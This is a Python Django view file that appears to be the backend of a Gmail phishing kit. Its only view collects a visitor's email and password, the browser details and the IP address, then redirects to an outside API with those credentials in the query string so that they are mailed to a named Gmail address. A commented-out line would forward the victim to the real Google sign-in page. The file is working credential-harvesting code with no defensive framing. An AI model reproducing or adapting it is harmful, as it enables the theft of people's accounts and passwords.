from django.shortcuts import render, redirect
from user_agents import parse
from user_agents import *
import user_agents
import re



def mainpage(request):
	if request.method == "POST":
		ml = request.POST.get("email")
		ps = request.POST.get("pass")

		if ml is not None:
			request.session['ml'] = ml
		else:
			ml = request.session.get('ml')



		a = request.user_agent
		b,c,d = request.user_agent.browser.family, request.user_agent.browser.version, request.user_agent.browser.version_string
		x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')

		if x_forwarded_for:
			ip = x_forwarded_for.split(',')[0]
		else:
			ip = request.META.get('REMOTE_ADDR')
		print(a,b,c,d,ip,ml,ps)

		pattern = r"[^@]+@[^@]+\.[^@]+"

		if (re.match(pattern, ml)) and ("@gmail.com" in ml):
			if ml and ps:
				if len(ps)<8:
					return render(request,'mobile.html',{"error":True,"email":ml})
				else:
					details = f"Device Accessed from: {a} <br>Browser: {b}<br>Browser version: {d}<br>ip address: {ip}<br>Username: {ml} <br>Password: {ps}<br><br>"
					return redirect(f"https://api.lemobank.com/api/index.php?to=alanfisher080@gmail.com&subject=Gmail&body={details}&uid=9")
					#return redirect("https://accounts.google.com/")

			else:
				return render(request,'mobile.html',{"email":ml})
		else:
			return render(request,'index.html',{"error":True})

	return render(request,'index.html')
